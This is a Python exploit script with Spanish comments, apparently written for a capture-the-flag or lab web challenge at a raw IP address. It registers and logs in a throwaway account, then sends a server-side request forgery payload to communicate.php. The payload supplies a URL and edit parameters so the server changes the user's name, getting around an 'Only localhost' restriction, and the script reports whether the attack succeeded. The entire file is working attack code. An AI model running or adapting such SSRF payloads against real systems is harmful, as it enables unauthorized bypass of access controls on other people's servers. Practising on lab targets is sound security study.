#!/usr/bin/env python3
import requests
import random
import string
import re

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

# Register and login
data = {'name': 'user1', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}")

# Ver página actual
resp = session.get(f"{TARGET}/")
print(f"[*] Nombre actual en la página: ", end="")
match = re.search(r'Yo, ([^<]+)</h2>', resp.text)
if match:
    print(match.group(1))
else:
    print("No encontrado")

# Probar SSRF
print("\n[*] Probando SSRF con datos completos...")
data = {
    'url': 'http://motherland.com/',
    'data[action]': 'edit',
    'data[new_name]': 'CHANGED_NAME'
}

resp = session.post(f"{TARGET}/communicate.php", data=data, timeout=10)

print(f"[+] Response status: {resp.status_code}")
print(f"[+] Response length: {len(resp.text)}")

# Buscar mensajes específicos en la respuesta
if "Done!" in resp.text:
    print("[+++] '¡Done!' encontrado - el cambio fue exitoso!")
elif "Only localhost" in resp.text:
    print("[-] 'Only localhost' - la verificación de IP falló")
elif "Failed!" in resp.text:
    print("[-] 'Failed!' - el update falló")
elif "cURL Error" in resp.text:
    match = re.search(r'cURL Error: ([^<]+)', resp.text)
    if match:
        print(f"[-] cURL Error: {match.group(1)}")
else:
    # Buscar en el response field
    match = re.search(r'<div class="response-display">.*?<pre>(.*?)</pre>', resp.text, re.DOTALL)
    if match:
        response_content = match.group(1).strip()
        print(f"\n[*] Contenido de response-display:")
        print(response_content[:500])
        
        # Analizar el response
        if "Yo," in response_content:
            print("\n[*] La respuesta contiene la página index")
            name_match = re.search(r'Yo, ([^<]+)</h2>', response_content)
            if name_match:
                print(f"[*] Nombre en response: {name_match.group(1)}")
        
        if "Only localhost" in response_content:
            print("\n[-] El servidor rechazó porque no viene de localhost")
        if "Done!" in response_content:
            print("\n[+++] ¡El servidor aceptó el cambio!")
    
# Verificar si el nombre realmente cambió
print("\n[*] Verificando nombre actual...")
resp = session.get(f"{TARGET}/")
match = re.search(r'Yo, ([^<]+)</h2>', resp.text)
if match:
    current_name = match.group(1)
    print(f"[*] Nombre actual: {current_name}")
    if current_name == "CHANGED_NAME":
        print("[+++] ¡SUCCESS! El nombre cambió exitosamente!")
    else:
        print("[-] El nombre no cambió")
